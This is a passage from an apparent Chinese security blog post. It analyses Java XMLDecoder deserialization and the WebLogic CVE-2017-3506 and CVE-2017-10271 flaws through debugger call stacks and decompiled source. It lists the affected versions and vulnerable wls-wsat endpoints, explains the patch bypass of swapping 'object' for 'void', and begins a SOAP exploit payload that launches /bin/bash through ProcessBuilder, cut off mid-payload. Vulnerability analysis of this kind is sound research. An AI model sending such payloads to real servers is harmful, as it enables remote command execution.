          <span class="comment">//therefore we don&#x27;t need to take care of anything here. So Just break;</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> XMLStreamConstants.CDATA:</span><br><span class="line">                fDocumentHandler.startCDATA(<span class="literal">null</span>);</span><br><span class="line">                <span class="comment">//xxx: check if CDATA values comes from getCharacterData() function</span></span><br><span class="line">                fDocumentHandler.characters(getCharacterData(),<span class="literal">null</span>);</span><br><span class="line">                fDocumentHandler.endCDATA(<span class="literal">null</span>);</span><br><span class="line">                <span class="comment">//System.out.println(&quot; in CDATA of the XMLNSDocumentScannerImpl&quot;);</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> XMLStreamConstants.NOTATION_DECLARATION :</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> XMLStreamConstants.ENTITY_DECLARATION :</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> XMLStreamConstants.NAMESPACE :</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> XMLStreamConstants.ATTRIBUTE :</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="comment">// 2</span></span><br><span class="line">            <span class="keyword">case</span> XMLStreamConstants.END_ELEMENT :</span><br><span class="line">                <span class="comment">//do not give callback here.</span></span><br><span class="line">                <span class="comment">//this callback is given in scanEndElement function.</span></span><br><span class="line">                <span class="comment">//fDocumentHandler.endElement(getElementQName(),null);</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span> :</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InternalError</span>(<span class="string">&quot;processing event: &quot;</span> + event);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//System.out.println(&quot;here in before calling next&quot;);</span></span><br><span class="line">        event = next();</span><br><span class="line">        <span class="comment">//System.out.println(&quot;here in after calling next&quot;);</span></span><br><span class="line">    &#125; <span class="keyword">while</span> (event!=XMLStreamConstants.END_DOCUMENT &amp;&amp; complete);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(event == XMLStreamConstants.END_DOCUMENT) &#123;</span><br><span class="line">        fDocumentHandler.endDocument(<span class="literal">null</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">&#125; <span class="comment">// scanDocument(boolean):boolean</span></span><br></pre></td></tr></table></figure>

<p>这个函数是扫描xml文档的一个方法，逐个标签读取，同时会读取到换行符<br>对于以上poc，解析流程为：714 14 14 14 14(cmd) 24 24 14 14(&#x2F;C) 24 24 14 14(calc) 24 24 24 124 28<br>这里的关键逻辑都在next中<br>比如在解析<code>&lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;</code>时，函数调用栈如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">addAttribute:<span class="number">84</span>, NewElementHandler (com.sun.beans.decoder)</span><br><span class="line">addAttribute:<span class="number">102</span>, ObjectElementHandler (com.sun.beans.decoder)</span><br><span class="line">startElement:<span class="number">294</span>, DocumentHandler (com.sun.beans.decoder)</span><br><span class="line">startElement:<span class="number">509</span>, AbstractSAXParser (com.sun.org.apache.xerces.internal.parsers)</span><br><span class="line">scanStartElement:<span class="number">1364</span>, XMLDocumentFragmentScannerImpl (com.sun.org.apache.xerces.internal.impl)</span><br><span class="line">next:<span class="number">2787</span>, XMLDocumentFragmentScannerImpl$FragmentContentDriver (com.sun.org.apache.xerces.internal.impl)</span><br><span class="line">next:<span class="number">606</span>, XMLDocumentScannerImpl (com.sun.org.apache.xerces.internal.impl)</span><br><span class="line">scanDocument:<span class="number">510</span>, XMLDocumentFragmentScannerImpl (com.sun.org.apache.xerces.internal.impl)</span><br><span class="line">parse:<span class="number">848</span>, XML11Configuration (com.sun.org.apache.xerces.internal.parsers)</span><br><span class="line">parse:<span class="number">777</span>, XML11Configuration (com.sun.org.apache.xerces.internal.parsers)</span><br><span class="line">parse:<span class="number">141</span>, XMLParser (com.sun.org.apache.xerces.internal.parsers)</span><br><span class="line">parse:<span class="number">1213</span>, AbstractSAXParser (com.sun.org.apache.xerces.internal.parsers)</span><br><span class="line">parse:<span class="number">643</span>, SAXParserImpl$JAXPSAXParser (com.sun.org.apache.xerces.internal.jaxp)</span><br><span class="line">parse:<span class="number">327</span>, SAXParserImpl (com.sun.org.apache.xerces.internal.jaxp)</span><br><span class="line">run:<span class="number">375</span>, DocumentHandler$<span class="number">1</span> (com.sun.beans.decoder)</span><br><span class="line">run:<span class="number">372</span>, DocumentHandler$<span class="number">1</span> (com.sun.beans.decoder)</span><br><span class="line">doPrivileged:-<span class="number">1</span>, AccessController (java.security)</span><br><span class="line">doIntersectionPrivilege:<span class="number">76</span>, ProtectionDomain$JavaSecurityAccessImpl (java.security)</span><br><span class="line">parse:<span class="number">372</span>, DocumentHandler (com.sun.beans.decoder)</span><br><span class="line">run:<span class="number">201</span>, XMLDecoder$<span class="number">1</span> (java.beans)</span><br><span class="line">run:<span class="number">199</span>, XMLDecoder$<span class="number">1</span> (java.beans)</span><br><span class="line">doPrivileged:-<span class="number">1</span>, AccessController (java.security)</span><br><span class="line">parsingComplete:<span class="number">199</span>, XMLDecoder (java.beans)</span><br><span class="line">readObject:<span class="number">250</span>, XMLDecoder (java.beans)</span><br><span class="line">main:<span class="number">11</span>, XmlDecoderTest (XmlDecoder)</span><br></pre></td></tr></table></figure>

<p>从next开始，首先进入XMLDocumentScannerImpl类的next方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">next</span><span class="params">()</span> <span class="keyword">throws</span> IOException, XNIException &#123;</span><br><span class="line">    <span class="keyword">return</span> fDriver.next();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的fDriver是XMLDocumentScannerImpl对象，接下来到XMLDocumentFragmentScannerImpl的next方法<br>这个方法比较长。主要是根据fScannerState参数来选择对应的case<br>这里进入这个case</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> SCANNER_STATE_START_ELEMENT_TAG :&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//xxx this function returns true when element is empty.. can be linked to end element event.</span></span><br><span class="line">    <span class="comment">//returns true if the element is empty</span></span><br><span class="line">    <span class="comment">// 扫描</span></span><br><span class="line">    fEmptyElement = scanStartElement() ;</span><br><span class="line">    <span class="comment">//if the element is empty the next event is &quot;end element&quot;</span></span><br><span class="line">    <span class="keyword">if</span>(fEmptyElement)&#123;</span><br><span class="line">        setScannerState(SCANNER_STATE_END_ELEMENT_TAG);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//set the next possible state</span></span><br><span class="line">        setScannerState(SCANNER_STATE_CONTENT);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> XMLEvent.START_ELEMENT ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>XMLDocumentFragmentScannerImpl类的scanStartElement方法主要作用是解析标签及其属性<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230816175350.png"><br>来到AbstractSAXParser类的startElement方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">fContentHandler.startElement(uri, localpart, element.rawname,</span><br><span class="line">                                             fAttributesProxy);</span><br></pre></td></tr></table></figure>

<p>进入这句，fContentHandler为DocumentHandler，进入DocumentHandler的startElement方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">startElement</span><span class="params">(String var1, String var2, String var3, Attributes var4)</span> <span class="keyword">throws</span> SAXException &#123;</span><br><span class="line">    <span class="type">ElementHandler</span> <span class="variable">var5</span> <span class="operator">=</span> <span class="built_in">this</span>.handler;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 创建一个新的ElementHandler实例，并通过反射设置其所有者和父级处理器</span></span><br><span class="line">        <span class="built_in">this</span>.handler = (ElementHandler)<span class="built_in">this</span>.getElementHandler(var3).newInstance();</span><br><span class="line">        <span class="built_in">this</span>.handler.setOwner(<span class="built_in">this</span>);</span><br><span class="line">        <span class="built_in">this</span>.handler.setParent(var5);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception var10) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SAXException</span>(var10);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 遍历属性列表，并将属性添加到当前处理器中</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">var6</span> <span class="operator">=</span> <span class="number">0</span>; var6 &lt; var4.getLength(); ++var6) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">var7</span> <span class="operator">=</span> var4.getQName(var6);</span><br><span class="line">            <span class="type">String</span> <span class="variable">var8</span> <span class="operator">=</span> var4.getValue(var6);</span><br><span class="line">            <span class="comment">// 这里</span></span><br><span class="line">            <span class="built_in">this</span>.handler.addAttribute(var7, var8);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RuntimeException var9) &#123;</span><br><span class="line">            <span class="built_in">this</span>.handleException(var9);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">this</span>.handler.startElement();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230816214212.png"><br>这里的this.handler指的是VoidElementHandler对象<br>可以进入getElementHandler函数，此时的var1是void</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;? <span class="keyword">extends</span> <span class="title class_">ElementHandler</span>&gt; getElementHandler(String var1) &#123;</span><br><span class="line">    <span class="type">Class</span> <span class="variable">var2</span> <span class="operator">=</span> (Class)<span class="built_in">this</span>.handlers.get(var1);</span><br><span class="line">    <span class="keyword">if</span> (var2 == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Unsupported element: &quot;</span> + var1);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> var2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230816223029.png"><br>所以最后得到的this.handler是VoidElementHandler对象对象<br>继续往下跟，来到ObjectElementHandler的addAttribute方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">addAttribute</span><span class="params">(String var1, String var2)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (var1.equals(<span class="string">&quot;idref&quot;</span>)) &#123;</span><br><span class="line">        <span class="built_in">this</span>.idref = var2;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var1.equals(<span class="string">&quot;field&quot;</span>)) &#123;</span><br><span class="line">        <span class="built_in">this</span>.field = var2;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var1.equals(<span class="string">&quot;index&quot;</span>)) &#123;</span><br><span class="line">        <span class="built_in">this</span>.index = Integer.valueOf(var2);</span><br><span class="line">        <span class="built_in">this</span>.addArgument(<span class="built_in">this</span>.index);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var1.equals(<span class="string">&quot;property&quot;</span>)) &#123;</span><br><span class="line">        <span class="built_in">this</span>.property = var2;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var1.equals(<span class="string">&quot;method&quot;</span>)) &#123;</span><br><span class="line">        <span class="built_in">this</span>.method = var2;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 进入到这里</span></span><br><span class="line">        <span class="built_in">super</span>.addAttribute(var1, var2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里传入的var1是”class”，var2是”java.lang.ProcessBuilder”<br>进入父类的addAttribute方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addAttribute</span><span class="params">(String var1, String var2)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (var1.equals(<span class="string">&quot;class&quot;</span>)) &#123;</span><br><span class="line">        <span class="comment">// 通过反射生成var2对应的对象</span></span><br><span class="line">        <span class="built_in">this</span>.type = <span class="built_in">this</span>.getOwner().findClass(var2);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.addAttribute(var1, var2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230816215928.png"><br>也可以进去看看，this.getOwner()得到的是DocumentHandler对象，调用其findClass方法，该方法中又调用ClassFinder.resolveClass方法，其方法中调用了ClassFinder.findClass方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; findClass(String var0, ClassLoader var1) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">    ReflectUtil.checkPackageAccess(var0);</span><br><span class="line">    <span class="keyword">if</span> (var1 != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// var0是类名，通过反射获取类</span></span><br><span class="line">            <span class="keyword">return</span> Class.forName(var0, <span class="literal">false</span>, var1);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException var3) &#123;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SecurityException var4) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 调用重载方法，作用也是一样</span></span><br><span class="line">    <span class="keyword">return</span> findClass(var0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其他元素的解析流程大致类似<br>再来看看字符串是如何解析的，如下面这句</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>calc<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>先解析<code>&lt;string&gt;</code>标签，创建StringElementHandler对象<br>然后再解析calc字符串<br>进入到对应的case中</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> XMLStreamConstants.CHARACTERS :</span><br><span class="line">    fDocumentHandler.characters(getCharacterData(),<span class="literal">null</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>

<p>进入fDocumentHandler.characters方法，这里传入的是calc字符串。此时的fDocumentHandler的handler参数是之前在解析<code>&lt;string&gt;</code>标签时创建StringElementHandler对象<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230817111448.png"><br>继续进入characters方法<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230817112014.png"><br>这里的var1正是poc字符，var2标识calc字符串的偏移，var3表示字符串的长度<br>this.handler是StringElementHandler对象，进入其addCharacter方法<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230817112341.png"><br>经过4次循环，将calc字符串添加到StringElementHandler对象的sb属性中<br>至此，字符串的解析完成</p>
<p>再来看看最后一句的解析，这也触发了命令执行</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;start&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>逐步调试，前面部分的流程和其他标签处理方法一致，进入ObjectElementHandler的getValueObject方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> ValueObject <span class="title function_">getValueObject</span><span class="params">(Class&lt;?&gt; var1, Object[] var2)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.field != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 如果存在字段（field），则通过FieldElementHandler获取上下文Bean（contextBean）中字段的值，并创建一个ValueObjectImpl实例返回</span></span><br><span class="line">        <span class="keyword">return</span> ValueObjectImpl.create(FieldElementHandler.getFieldValue(<span class="built_in">this</span>.getContextBean(), <span class="built_in">this</span>.field));</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">this</span>.idref != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 如果存在idref，则通过getVariable方法获取变量的值，并创建一个ValueObjectImpl实例返回</span></span><br><span class="line">        <span class="keyword">return</span> ValueObjectImpl.create(<span class="built_in">this</span>.getVariable(<span class="built_in">this</span>.idref));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">var3</span> <span class="operator">=</span> <span class="built_in">this</span>.getContextBean();</span><br><span class="line">        String var4;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.index != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 如果存在索引（index），根据var2的长度确定是设置方法还是获取方法</span></span><br><span class="line">            var4 = var2.length == <span class="number">2</span> ? <span class="string">&quot;set&quot;</span> : <span class="string">&quot;get&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">this</span>.property != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 如果存在属性（property），根据var2的长度确定是设置方法还是获取方法，并根据属性名构造对应的方法名</span></span><br><span class="line">            var4 = var2.length == <span class="number">1</span> ? <span class="string">&quot;set&quot;</span> : <span class="string">&quot;get&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="number">0</span> &lt; <span class="built_in">this</span>.property.length()) &#123;</span><br><span class="line">                var4 = var4 + <span class="built_in">this</span>.property.substring(<span class="number">0</span>, <span class="number">1</span>).toUpperCase(Locale.ENGLISH) + <span class="built_in">this</span>.property.substring(<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 如果存在方法（method），则使用指定的方法名，否则使用默认的&quot;new&quot;方法名</span></span><br><span class="line">            var4 = <span class="built_in">this</span>.method != <span class="literal">null</span> &amp;&amp; <span class="number">0</span> &lt; <span class="built_in">this</span>.method.length() ? <span class="built_in">this</span>.method : <span class="string">&quot;new&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 创建一个Expression实例，用于调用指定的方法，并获取返回值</span></span><br><span class="line">        <span class="type">Expression</span> <span class="variable">var5</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Expression</span>(var3, var4, var2);</span><br><span class="line">        <span class="comment">// 创建一个ValueObjectImpl实例，将Expression的返回值包装为ValueObjectImpl，并返回</span></span><br><span class="line">        <span class="keyword">return</span> ValueObjectImpl.create(var5.getValue());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先进入NewElementHandler类的getContextBean方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Object <span class="title function_">getContextBean</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.type != <span class="literal">null</span> ? <span class="built_in">this</span>.type : <span class="built_in">super</span>.getContextBean();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的type为空，所以需要进入父类的getContextBean方法<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230817170117.png"><br>其实根据poc的结构也知道，这里的父类就是type为ProcessBuilder对应的VoidElementHandler对象<br>此时继续进入父类的getValueObject方法<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230817170529.png"><br>进入重载方法，同样先调用getContextBean()，由于此时type不为空，所以返回type<br>接着对于方法而言，由于方法为空，所以设置为new<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230817170950.png"><br>这里相当于创建一个ProcessBuilder对象<br>继续回到解析<code>&lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;</code>的getValueObject方法，此时的var3经过getContextBean处理后的是ProcessBuilder对象<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230817171635.png"><br>最后一行，调用了ProcessBuilder对象的start方法，命令执行成功<br>函数调用栈：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">getValue:<span class="number">157</span>, Expression (java.beans)</span><br><span class="line">getValueObject:<span class="number">166</span>, ObjectElementHandler (com.sun.beans.decoder)</span><br><span class="line">getValueObject:<span class="number">123</span>, NewElementHandler (com.sun.beans.decoder)</span><br><span class="line">endElement:<span class="number">169</span>, ElementHandler (com.sun.beans.decoder)</span><br><span class="line">endElement:<span class="number">318</span>, DocumentHandler (com.sun.beans.decoder)</span><br><span class="line">endElement:<span class="number">609</span>, AbstractSAXParser (com.sun.org.apache.xerces.internal.parsers)</span><br><span class="line">emptyElement:<span class="number">183</span>, AbstractXMLDocumentParser (com.sun.org.apache.xerces.internal.parsers)</span><br><span class="line">scanStartElement:<span class="number">1344</span>, XMLDocumentFragmentScannerImpl (com.sun.org.apache.xerces.internal.impl)</span><br><span class="line">next:<span class="number">2787</span>, XMLDocumentFragmentScannerImpl$FragmentContentDriver (com.sun.org.apache.xerces.internal.impl)</span><br><span class="line">next:<span class="number">606</span>, XMLDocumentScannerImpl (com.sun.org.apache.xerces.internal.impl)</span><br><span class="line">scanDocument:<span class="number">510</span>, XMLDocumentFragmentScannerImpl (com.sun.org.apache.xerces.internal.impl)</span><br><span class="line">parse:<span class="number">848</span>, XML11Configuration (com.sun.org.apache.xerces.internal.parsers)</span><br><span class="line">parse:<span class="number">777</span>, XML11Configuration (com.sun.org.apache.xerces.internal.parsers)</span><br><span class="line">parse:<span class="number">141</span>, XMLParser (com.sun.org.apache.xerces.internal.parsers)</span><br><span class="line">parse:<span class="number">1213</span>, AbstractSAXParser (com.sun.org.apache.xerces.internal.parsers)</span><br><span class="line">parse:<span class="number">643</span>, SAXParserImpl$JAXPSAXParser (com.sun.org.apache.xerces.internal.jaxp)</span><br><span class="line">parse:<span class="number">327</span>, SAXParserImpl (com.sun.org.apache.xerces.internal.jaxp)</span><br><span class="line">run:<span class="number">375</span>, DocumentHandler$<span class="number">1</span> (com.sun.beans.decoder)</span><br><span class="line">run:<span class="number">372</span>, DocumentHandler$<span class="number">1</span> (com.sun.beans.decoder)</span><br><span class="line">doPrivileged:-<span class="number">1</span>, AccessController (java.security)</span><br><span class="line">doIntersectionPrivilege:<span class="number">76</span>, ProtectionDomain$JavaSecurityAccessImpl (java.security)</span><br><span class="line">parse:<span class="number">372</span>, DocumentHandler (com.sun.beans.decoder)</span><br><span class="line">run:<span class="number">201</span>, XMLDecoder$<span class="number">1</span> (java.beans)</span><br><span class="line">run:<span class="number">199</span>, XMLDecoder$<span class="number">1</span> (java.beans)</span><br><span class="line">doPrivileged:-<span class="number">1</span>, AccessController (java.security)</span><br><span class="line">parsingComplete:<span class="number">199</span>, XMLDecoder (java.beans)</span><br><span class="line">readObject:<span class="number">250</span>, XMLDecoder (java.beans)</span><br><span class="line">main:<span class="number">11</span>, XmlDecoderTest (XmlDecoder)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>Expression这个类,该类主要作用是动态调用指定对象的methodName方法.</p>
</blockquote>
<p><strong>参考</strong>：<br><a href="https://zhuanlan.zhihu.com/p/108754274">XMLDecoder反序列化漏洞源码分析 - 知乎 (zhihu.com)</a></p>
<h3 id="CVE-2017-3506"><a href="#CVE-2017-3506" class="headerlink" title="CVE-2017-3506"></a>CVE-2017-3506</h3><p><strong>影响范围</strong>：<br>WebLogic 10.3.6.0<br>WebLogic 12.1.3.0<br>WebLogic 12.2.1.0<br>WebLogic 12.2.1.1<br>WebLogic 12.2.1.2<br>CVE-2017-10271也是一致</p>
<p>默认受到影响的uri：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">/wls-wsat/CoordinatorPortType</span><br><span class="line">/wls-wsat/RegistrationPortTypeRPC</span><br><span class="line">/wls-wsat/ParticipantPortType</span><br><span class="line">/wls-wsat/RegistrationRequesterPortType</span><br><span class="line">/wls-wsat/CoordinatorPortType11</span><br><span class="line">/wls-wsat/RegistrationPortTypeRPC11</span><br><span class="line">/wls-wsat/ParticipantPortType11</span><br><span class="line">/wls-wsat/RegistrationRequesterPortType11</span><br></pre></td></tr></table></figure>

<p><strong>分析</strong>：<br>原理大致和下面CVE-2017-10271一致<br><strong>补丁分析</strong>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">validate</span><span class="params">(InputStream is)</span> &#123;</span><br><span class="line">    <span class="type">WebLogicSAXParserFactory</span> <span class="variable">factory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WebLogicSAXParserFactory</span>();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">SAXParser</span> <span class="variable">parser</span> <span class="operator">=</span> factory.newSAXParser();</span><br><span class="line">        parser.parse(is, <span class="keyword">new</span> <span class="title class_">DefaultHandler</span>() &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">startElement</span><span class="params">(String uri, String localName, String qName, Attributes attributes)</span> <span class="keyword">throws</span> SAXException &#123;</span><br><span class="line">            <span class="keyword">if</span>(qName.equalsIgnoreCase(<span class="string">&quot;object&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Invalid context type: object&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ParserConfigurationException var5) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Parser Exception&quot;</span>, var5);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (SAXException var6) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Parser Exception&quot;</span>, var6);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException var7) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Parser Exception&quot;</span>, var7);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里就是将object标签进行过滤，绕过方式就是将object修改成void，也就是CVE-2017-10271</p>
<h3 id="CVE-2017-10271"><a href="#CVE-2017-10271" class="headerlink" title="CVE-2017-10271"></a>CVE-2017-10271</h3><p><strong>环境搭建</strong>：<br>使用vulhub中的环境，修改docekr-compose.yml文件，加上8453端口的映射，使其能够调试<br><strong>复现</strong>：<br>exp:</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">&quot;http://bea.com/2004/06/soap/workarea/&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">&quot;1.4.0&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.XMLDecoder&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">void</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.String&quot;</span> <span class="attr">length</span>=<span class="string">&quot;3&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;0&quot;</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">string</span>&gt;</span>/bin/bash<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span 